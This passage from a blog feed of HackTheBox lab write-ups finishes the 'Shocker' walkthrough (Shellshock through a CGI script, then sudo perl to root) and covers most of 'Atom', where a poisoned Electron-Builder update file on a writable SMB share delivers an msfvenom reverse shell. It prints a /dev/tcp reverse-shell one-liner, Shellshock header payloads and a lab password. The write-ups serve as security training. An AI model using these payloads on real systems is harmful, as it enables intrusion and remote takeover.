/cgi-bin/             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 294<span class="o">]</span>
/icons/               <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 292<span class="o">]</span>
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>Another scan on <code>/cgi-bin/</code> discovers a file called <code>users.sh</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
$ gobuster dir -u http://10.10.10.56/cgi-bin -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster/gobuster-cgi-bin -f -x cgi,sh
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.10.56/cgi-bin
<span class="o">[</span>+<span class="o">]</span> Method:                  GET
<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
<span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
<span class="o">[</span>+<span class="o">]</span> Extensions:              cgi,sh
<span class="o">[</span>+<span class="o">]</span> Add Slash:               <span class="nb">true</span>
<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
<span class="o">===============================================================</span>
2021/07/10 21:43:04 Starting gobuster in directory enumeration <span class="nv">mode</span>
<span class="o">===============================================================</span>
/user.sh              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 125<span class="o">]</span>
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>The <code>script.sh</code> returns the following contents.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
$ curl -s http://10.10.10.56/cgi-bin/user.sh
Content-Type: text/plain

Just an uptime <span class="nb">test</span> script

 21:46:09 up <span class="m">1</span> day, 20:28,  <span class="m">0</span> users,  load average: 0.00, 0.01, 0.00
</code></pre></div><p>According to the box name and a <code>/cgi-bin/</code> folder which contains a bash script, it&rsquo;s going to be shellshock vulnerability.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-shelly">Shell as shelly</h3>
<h4 id="shellshock-cve-2014-6271">Shellshock (CVE-2014-6271)</h4>
<p>The Shellshock vulnerability is well explained in this <a href="https://pentesterlab.com/exercises/cve-2014-6271/course">free course</a> by PentesterLab.</p>
<p>The following is the commonly used PoC for shellshock.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="o">(){</span>:<span class="o">}</span><span class="p">;</span> echo<span class="p">;</span> &lt;bash command&gt;
</code></pre></div><p>The PoC works on <code>User-Agent</code> header.</p>
<p><img class="img-container" src="imgs/image-20210711090447537-1626151933213.png" alt="image-20210711090447537"  />
</p>
<p>It also works on the  <code>Accept</code> header (I&rsquo;m shocked now 😄).</p>
<p><img class="img-container" src="imgs/image-20210711085942731.png" alt="image-20210711085942731"  />
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>I tried to get a shell but somehow it didn&rsquo;t connect back, but then I figured out why after redirecting stderr to stderr, it wanted a full path!</p>
<p><img class="img-container" src="imgs/image-20210711091930431.png" alt="image-20210711091930431"  />
</p>
<p>The installed <code>nc</code> doesn&rsquo;t have <code>-e</code>.</p>
<p><img class="img-container" src="imgs/image-20210711092401328.png" alt="image-20210711092401328"  />
</p>
<p>The following bash reverse shell works.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">()</span> <span class="o">{</span> :<span class="p">;</span><span class="o">}</span><span class="p">;</span> echo<span class="p">;</span> <span class="nb">echo</span> <span class="s2">&#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.83/53 0&gt;&amp;1&#34;</span> <span class="p">|</span> /bin/bash
</code></pre></div><p><img class="img-container" src="imgs/image-20210711093314357.png" alt="image-20210711093314357"  />
</p>
<h4 id="shell-upgrade">Shell Upgrade</h4>
<p>I&rsquo;ll upgrade my shell using the PTY trick (that&rsquo;s how I called it).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">shelly@Shocker:/usr/lib/cgi-bin$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
shelly@Shocker:/usr/lib/cgi-bin$ script /dev/null -c bash                    
script /dev/null -c bash
Script started, file is /dev/null
shelly@Shocker:/usr/lib/cgi-bin$ ^Z
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">7339</span> suspended  nc -nvlp <span class="m">53</span>
→ kali@kali «shocker» «10.10.14.83» 
$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">7339</span> continued  nc -nvlp <span class="m">53</span>

shelly@Shocker:/usr/lib/cgi-bin$  
</code></pre></div><p>The user flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">shelly@Shocker:/home/shelly$ ls -l 
total <span class="m">8</span>
drwxr-xr-x <span class="m">2</span> shelly shelly <span class="m">4096</span> Jul <span class="m">10</span> 03:31 <span class="nb">test</span>
-r--r--r-- <span class="m">1</span> root   root     <span class="m">33</span> Jul  <span class="m">9</span> 01:17 user.txt
shelly@Shocker:/home/shelly$ cat user.txt 
7ac9eb73e6cb...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>A quick check on sudo privileges reveals that user <code>shelly</code> can run <code>perl</code> with <code>sudo</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
sudo -l
Matching Defaults entries <span class="k">for</span> shelly on Shocker:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User shelly may run the following commands on Shocker:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/perl
</code></pre></div><h4 id="sudo---perl">Sudo - perl</h4>
<p>Using <a href="https://gtfobins.github.io/gtfobins/perl/#sudo">GTFOBins</a> as reference, I&rsquo;m now root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">shelly@Shocker:/home/shelly$ sudo -u root perl -e <span class="s1">&#39;exec &#34;/bin/bash&#34;;&#39;</span>
root@Shocker:/home/shelly# id <span class="o">&amp;&amp;</span> hostname
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
Shocker
root@Shocker:/home/shelly#
</code></pre></div><p>The root flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@Shocker:~# cat root.txt
e3689b13acb2...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h2 id="extras">Extras</h2>
<p>Since this vulnerability is interesting yet dangerous, I&rsquo;d like to observe how it works.</p>
<h3 id="playing-a-bit-with-shellshock">Playing a bit with Shellshock</h3>
<p>I did a quick test using the following script which placed under /<code>cgi-bin/</code> folder. The script will prints all the environment variables.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@Shocker:/usr/lib/cgi-bin# <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/bash\necho test\nenv&#39;</span> &gt; iamf.sh
root@Shocker:/usr/lib/cgi-bin# chmod +x iamf.sh 
</code></pre></div><p>And now I could understand why it is so dangerous. It even exports my custom header and turns it into an environment variable.</p>
<p><img class="img-container" src="imgs/image-20210711100705447.png" alt="image-20210711100705447"  />
</p>
<p>The full response</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">HTTP/1.1 200 OK
Date: Sun, 11 Jul 2021 03:06:31 GMT
Server: Apache/2.4.18 (Ubuntu)
Connection: close
Content-Type: text/x-sh
Content-Length: 1113

iamf
test
SERVER_SIGNATURE=&lt;address&gt;Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80&lt;/address&gt;

HTTP_USER_AGENT=Blackhole
SERVER_PORT=80
HTTP_HOST=10.10.10.56
DOCUMENT_ROOT=/var/www/html
SCRIPT_FILENAME=/usr/lib/cgi-bin/iamf.sh
REQUEST_URI=/cgi-bin/iamf.sh
SCRIPT_NAME=/cgi-bin/iamf.sh
HTTP_CONNECTION=close
REMOTE_PORT=58222
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HTTP_IF_NONE_MATCH=&#34;89-559ccac257884-gzip&#34;
CONTEXT_PREFIX=/cgi-bin/
PWD=/usr/lib/cgi-bin
SERVER_ADMIN=webmaster@localhost
REQUEST_SCHEME=http
HTTP_IF_MODIFIED_SINCE=Fri, 22 Sep 2017 20:01:19 GMT
HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
REMOTE_ADDR=10.10.14.83
SHLVL=1
SERVER_NAME=10.10.10.56
CONTENT_LENGTH=0
SERVER_SOFTWARE=Apache/2.4.18 (Ubuntu)
QUERY_STRING=
SERVER_ADDR=10.10.10.56
GATEWAY_INTERFACE=CGI/1.1
HTTP_UPGRADE_INSECURE_REQUESTS=1
SERVER_PROTOCOL=HTTP/1.1
HTTP_CACHE_CONTROL=max-age=0
HTTP_ACCEPT_ENCODING=gzip, deflate
REQUEST_METHOD=GET
CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
HTTP_IAMF_HEADER=() {  :
}
_=/usr/bin/env
</code></pre></div><hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://pentesterlab.com/exercises/cve-2014-6271/course">https://pentesterlab.com/exercises/cve-2014-6271/course</a></li>
<li><a href="https://gtfobins.github.io/gtfobins/perl/#sudo">https://gtfobins.github.io/gtfobins/perl/#sudo</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Atom</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-atom/</link>
      <pubDate>Sat, 10 Jul 2021 20:28:32 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-atom/</guid>
      <description>Atom brings a real-life exploitation of a vulnerability in the auto-update feature of Electron-Builder. In Atom, there is a writable SMB share which is used by a company to store an update definition file for QA testing. By leveraging the write access, a malicious update definition can be uploaded there. This malicious update definition points to my reverse shell binary, which results in gaining an interactive shell to the system. Internal enumeration of the system finds a password which can be used to authenticate to a Redis server.</description>
      <content:encoded><![CDATA[<p>Atom brings a real-life exploitation of a vulnerability in the auto-update feature of Electron-Builder. In Atom, there is a writable SMB share which is used by a company to store an update definition file for QA testing. By leveraging the write access, a malicious update definition can be uploaded there. This malicious update definition points to my reverse shell binary, which results in gaining an interactive shell to the system. Internal enumeration of the system finds a password which can be used to authenticate to a Redis server. I&rsquo;m able to obtain administrator credentials by dumping the Redis database.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Exploitation of Electron-Builder app through auto-update.</li>
<li>Redis enumeration</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Nmap</li>
<li>CrackMapExec</li>
<li>Msfvenom</li>
<li>Netcat</li>
<li>Impacket</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan with <code>nmap</code> discovers six open ports: HTTP on 80 and its secure version on 443, MSRPC on 135, SMB on 445, WinRM on 5985 and Redis on 6379.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
$ nmap -p- --max-rate <span class="m">1000</span> -sV --reason -oA nmap/10-tcp-allport-atom 10.10.10.237
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-17 07:56 EDT
Nmap scan report <span class="k">for</span> 10.10.10.237
Host is up, received echo-reply ttl <span class="m">127</span> <span class="o">(</span>0.051s latency<span class="o">)</span>.
Not shown: <span class="m">65529</span> filtered ports
Reason: <span class="m">65529</span> no-responses
PORT     STATE SERVICE      REASON          VERSION
80/tcp   open  http         syn-ack ttl <span class="m">127</span> Apache httpd 2.4.46 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
135/tcp  open  msrpc        syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
443/tcp  open  ssl/http     syn-ack ttl <span class="m">127</span> Apache httpd 2.4.46 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
445/tcp  open  microsoft-ds syn-ack ttl <span class="m">127</span> Microsoft Windows <span class="m">7</span> - <span class="m">10</span> microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
5985/tcp open  http         syn-ack ttl <span class="m">127</span> Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
6379/tcp open  redis        syn-ack ttl <span class="m">127</span> Redis key-value store
Service Info: Host: ATOM<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 153.92 seconds
</code></pre></div><p>A script scan doesn&rsquo;t really helpful, so I&rsquo;ll skip that here.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-6379---redis">TCP 6379 - Redis</h3>
<p>On Redis, authenticated is required.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «smb» «10.10.14.49» 
$ nc -nv 10.10.10.237 <span class="m">6379</span>
<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.237<span class="o">]</span> <span class="m">6379</span> <span class="o">(</span>?<span class="o">)</span> open
INFO
-NOAUTH Authentication required.
</code></pre></div><h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>SMB enumeration with Anonymous logon using <code>crackmapexec</code> reveals the Windows version and one writable share.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
$ crackmapexec smb 10.10.10.237 -u <span class="s1">&#39;ANONYMOUS&#39;</span> -p <span class="s1">&#39;&#39;</span> --shares
SMB         10.10.10.237    <span class="m">445</span>    ATOM             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> Pro <span class="m">19042</span> x64 <span class="o">(</span>name:ATOM<span class="o">)</span> <span class="o">(</span>domain:ATOM<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         10.10.10.237    <span class="m">445</span>    ATOM             <span class="o">[</span>+<span class="o">]</span> ATOM<span class="se">\A</span>NONYMOUS: 
SMB         10.10.10.237    <span class="m">445</span>    ATOM             <span class="o">[</span>+<span class="o">]</span> Enumerated shares
SMB         10.10.10.237    <span class="m">445</span>    ATOM             Share           Permissions     Remark
SMB         10.10.10.237    <span class="m">445</span>    ATOM             -----           -----------     ------
SMB         10.10.10.237    <span class="m">445</span>    ATOM             ADMIN$                          Remote Admin
SMB         10.10.10.237    <span class="m">445</span>    ATOM             C$                              Default share
SMB         10.10.10.237    <span class="m">445</span>    ATOM             IPC$                            Remote IPC
SMB         10.10.10.237    <span class="m">445</span>    ATOM             Software_Updates READ,WRITE      
</code></pre></div><h4 id="software_updates-share">Software_Updates Share</h4>
<p>In <code>Software_Updates</code>, there is a PDF file called <code>UAT_Testing_Procedures.pdf</code>. I&rsquo;ll grab that file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
$ smbclient -N //10.10.10.237/Software_Updates
Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> dir
  .                                   D        <span class="m">0</span>  Mon May <span class="m">17</span> 08:05:58 <span class="m">2021</span>
  ..                                  D        <span class="m">0</span>  Mon May <span class="m">17</span> 08:05:58 <span class="m">2021</span>
  client1                             D        <span class="m">0</span>  Mon May <span class="m">17</span> 08:05:58 <span class="m">2021</span>
  client2                             D        <span class="m">0</span>  Mon May <span class="m">17</span> 08:05:58 <span class="m">2021</span>
  client3                             D        <span class="m">0</span>  Mon May <span class="m">17</span> 08:05:58 <span class="m">2021</span>
  UAT_Testing_Procedures.pdf          A    <span class="m">35202</span>  Fri Apr  <span class="m">9</span> 07:18:08 <span class="m">2021</span>

                <span class="m">4413951</span> blocks of size 4096. <span class="m">1361569</span> blocks available
smb: <span class="se">\&gt;</span> recurse on
smb: <span class="se">\&gt;</span> prompt off
smb: <span class="se">\&gt;</span> mget *
getting file <span class="se">\U</span>AT_Testing_Procedures.pdf of size <span class="m">35202</span> as UAT_Testing_Procedures.pdf <span class="o">(</span>121.5 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 121.5 KiloBytes/sec<span class="o">)</span>
</code></pre></div><h3 id="tcp-80443---website">TCP 80,443 - Website</h3>
<p>Both port 80 and 443 are displaying a software company site called &ldquo;Heed Solutions&rdquo;.</p>
<p><img class="img-container" src="imgs/image-20210517190515610.png" alt="image-20210517190515610"  />
</p>
<p>At the bottom, there is a hostname and a download link that points to <code>http://10.10.10.237/releases/heed_setup_v1.0.0.zip</code>.</p>
<p><img class="img-container" src="imgs/image-20210517190532910.png" alt="image-20210517190532910"  />
</p>
<p>I&rsquo;ll add the hostname to my <code>/etc/hosts</code> file and then download the previous software.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.237 atom.htb&#39;</span> &gt;&gt; /etc/hosts
</code></pre></div><p>After the hostname added, the site still shows the same content.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
$ curl -s -k https://10.10.10.237/ <span class="p">|</span> wc -c
<span class="m">7581</span>
→ root@kali «atom» «10.10.14.49» 
$ curl -s -k http://10.10.10.237/ <span class="p">|</span> wc -c 
<span class="m">7581</span>
→ root@kali «atom» «10.10.14.49» 
$ curl -s -k http://atom.htb/ <span class="p">|</span> wc -c
<span class="m">7581</span>
→ root@kali «atom» «10.10.14.49» 
$ curl -s -k https://atom.htb/ <span class="p">|</span> wc -c
<span class="m">7581</span>
</code></pre></div><h3 id="analysis">Analysis</h3>
<p>The previous zip file contains one executable file called <code>heedv1 Setup 1.0.0.exe</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «loot» «10.10.14.49» 
$ file heedv1_setup_1.0.0.exe 
heedv1_setup_1.0.0.exe: PE32 executable <span class="o">(</span>GUI<span class="o">)</span> Intel 80386, <span class="k">for</span> MS Windows, Nullsoft Installer self-extracting archive
</code></pre></div><p>It says &ldquo;self-extracting archive&rdquo;, meaning it can be extracted, for example using <code>7z</code>.</p>
<p>While looking into the app structure, I spotted a file called <code>app-update.yml</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «heed_extracted» «10.10.14.49» 
$ tree
.
├── <span class="nv">$PLUGINSDIR</span>
│   ├── app-64
...&lt;SNIP&gt;...
│   │   ├── natives_blob.bin
│   │   ├── resources
│   │   │   ├── app.asar
│   │   │   ├── app-update.yml <span class="c1"># ==&gt; Updater config</span>
│   │   │   ├── electron.asar
│   │   │   ├── elevate.exe
│   │   │   └── inspector
...&lt;SNIP&gt;...

<span class="m">73</span> directories, <span class="m">274</span> files
</code></pre></div><p>The file contains another hostname, which I&rsquo;ll add it to <code>/etc/hosts</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «heed_extracted» «10.10.14.49» 
$ cat ./<span class="se">\$</span>PLUGINSDIR/app-64/resources/app-update.yml
provider: generic
url: <span class="s1">&#39;http://updates.atom.htb&#39;</span>
publisherName:
  - HackTheBox
</code></pre></div><p>And again, it is the same site.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «heed_extracted» «10.10.14.49» 
$ curl -s http://updates.atom.htb/ <span class="p">|</span> wc -c
<span class="m">7581</span>
</code></pre></div><p>Guessing based on the content of <code>UAT_Testing_Procedures.pdf</code> file from SMB enumeration, <code>heedv1_setup_1.0.0.exe </code> is currently on testing phase. Other information that I can obtain are:</p>
<ul>
<li>The app is packed with electron-builder</li>
<li>The app has auto-update feature, but before releasing the updated app, the QA team will test it first.</li>
</ul>
<p><img class="img-container" src="imgs/image-20210517200229002.png" alt="image-20210517200229002"  />
</p>
<p>According to the image above, the <code>client</code> folder here probably refers to the ones on SMB.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-jason">Shell as Jason</h3>
<h4 id="rce-electron-updater---background">RCE Electron-Updater - Background</h4>
<p>I went to the rabbit hole by analyzing the executable file. At first, I thought I could inject the <code>app-update.yml</code> to point to my malicious <code>.exe</code> file and repack the app. I got the idea of poisoning the update file but didn&rsquo;t know where to start until I found this <a href="https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html">blog</a>.</p>
<p>According to that blog, during a software update, previous Electron-Updater uses the following line to perform a signature verification check on the new version of binary file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">execFile(&#34;powershell.exe&#34;, [&#34;-NoProfile&#34;, &#34;-NonInteractive&#34;, &#34;-InputFormat&#34;, &#34;None&#34;, &#34;-Command&#34;, `Get-AuthenticodeSignature &#39;${tempUpdateFile}&#39; | ConvertTo-Json -Compress`], {
...&lt;SNIP&gt;...
</code></pre></div><p>If <code>${tempUpdateFile}</code> is a user-controlled input, this can be leveraged for command injection: <code>';calc;'</code></p>
<blockquote>
<p><em>Since the <code>${tempUpdateFile}</code> variable is provided unescaped to the <code>execFile</code> utility, an attacker could bypass the entire signature verification by triggering a parse error in the script.</em></p>
</blockquote>
<p>The following is an example of malicious update definition that will pop a calculator.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">version: 2.0.0
path: u&#39;;calc;&#39;pdate.exe
sha512: qwP35Rn5PLaBoZ8tzvRFK...&lt;SNIP&gt;...LM3WCmvJUXMYmZGW6T+fI=
releaseDate: &#39;2021-01-24T13:44:59.064Z&#39;
</code></pre></div><p>Sending this <code>u';payload;'pdate.exe</code> as path would be troublesome, which is simplified as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">`Get-AuthenticodeSignature &#39;u&#39;;payload;&#39;pdate.exe&#39; | ConvertTo-Json -Compress`
</code></pre></div><p>Now that if a single quote <code>'</code> is added to <code>path</code>, it becomes:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">`Get-AuthenticodeSignature &#39;u&#39;pdate.exe&#39; | ConvertTo-Json -Compress`
</code></pre></div><p>But then, the line above would breaks the signature verification.</p>
<p>And here&rsquo;s come the interesting part, an attacker could easily bypass this signature verification by recalculating the hash of <code>u'pdate.exe</code>. That&rsquo;s very clever, right?</p>
<h4 id="rce-electron-updater---exploitation">RCE Electron-Updater - Exploitation</h4>
<p>According to the SMB enumeration, all the <code>client</code> folders are writable, which means exploitation can be done in two ways: local and remote. But, I&rsquo;ll go with remote 😅.</p>
<p>First, I&rsquo;ll have to generate a reverse shell binary. This can be done with <code>msfvenom</code>. I&rsquo;ll host this binary using Python web server afterwards.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49» 
$ msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.49 <span class="nv">LPORT</span><span class="o">=</span><span class="m">53</span> -f exe -o i<span class="se">\&#39;</span>amf.exe
<span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: <span class="m">460</span> bytes
Final size of exe file: <span class="m">7168</span> bytes
Saved as: i<span class="err">&#39;</span>amf.exe
</code></pre></div><p>Next, I&rsquo;ll need to calculate the hash of <code>i'amf.exe</code> using the following command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49» 
$ shasum -a <span class="m">512</span> i<span class="se">\&#39;</span>amf.exe <span class="p">|</span> cut -d <span class="s1">&#39; &#39;</span> -f1 <span class="p">|</span> xxd -r -p <span class="p">|</span> base64 <span class="p">|</span> tr -d <span class="s1">&#39;\n&#39;</span>
Y4xekmQ80+ALOD0xXBgPdaOmgSsbK8jACQ6xmF4ndoEOvleyI4HRTDniVdExVNryCPWGgxOElKPhMyJCywuLtw<span class="o">==</span>
</code></pre></div><p>The last thing I need is the update file. I&rsquo;ll create one called <code>update-iamf.yml</code>  which contains the following update definitions:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="m">2.0.1</span><span class="w">
</span><span class="w"></span><span class="nt">path</span><span class="p">:</span><span class="w"> </span><span class="l">http://10.10.14.83/i&#39;amf.exe</span><span class="w">
</span><span class="w"></span><span class="nt">sha512</span><span class="p">:</span><span class="w"> </span><span class="l">Y4xekmQ80+ALOD0xXBgPdaOmgSsbK8jACQ6xmF4ndoEOvleyI4HRTDniVdExVNryCPWGgxOElKPhMyJCywuLtw==</span><span class="w">
</span><span class="w"></span><span class="nt">releaseDate</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;2021-01-24T13:44:59.064Z&#39;</span><span class="w">
</span></code></pre></div><p>I&rsquo;ll upload the update file to <code>Software_Updates</code> share using <code>smbclient</code>  and start a netcat listener. After a few minutes, the reverse shell binary connected to my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49» 
$ smbclient -N //10.10.10.237/Software_Updates -c <span class="s2">&#34;put iamf-update.yml client1/latest.yml&#34;</span>  <span class="o">&amp;&amp;</span> nc -nvlp <span class="m">53</span>
putting file iamf-update.yml as <span class="se">\c</span>lient1<span class="se">\l</span>atest.yml <span class="o">(</span>1.1 kb/s<span class="o">)</span> <span class="o">(</span>average 1.1 kb/s<span class="o">)</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
connect to <span class="o">[</span>10.10.14.49<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.237<span class="o">]</span> <span class="m">64352</span>
Microsoft Windows <span class="o">[</span>Version 10.0.19042.906<span class="o">]</span>
<span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;whoami
whoami
atom<span class="se">\j</span>ason

C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;
</code></pre></div><p><img class="img-container" src="imgs/image-20210517220650699.png" alt="image-20210517220650699"  />
</p>
<p>User flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\U</span>sers<span class="se">\j</span>ason<span class="se">\D</span>esktop&gt;type user.txt
<span class="nb">type</span> user.txt
b77e754354e186f...&lt;SNIP&gt;...
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-system">Shell as SYSTEM</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>WinPEAS discovers a set of credentials for user <code>jason</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">...&lt;SNIP&gt;...
[+] Checking Credential manager
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string


     Username:              ATOM\jason
     Password:               kidvscat_electron_@123
     Target:                ATOM\jason
     PersistenceType:       Enterprise
     LastWriteTime:         3/31/2021 2:53:49 AM
</code></pre></div><p>On Jason&rsquo;s download directory, there is a PortableKanban folder. PortableKanban itself is a password manager. I have familiarity with this application from HTB Sharp (I&rsquo;ve not been able to pwn it, though 😂).  Its config contains encrypted Redis database password (The clear password revealed in the next section).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">C:\Users\jason\Downloads&gt;type PortableKanban\PortableKanban.cfg
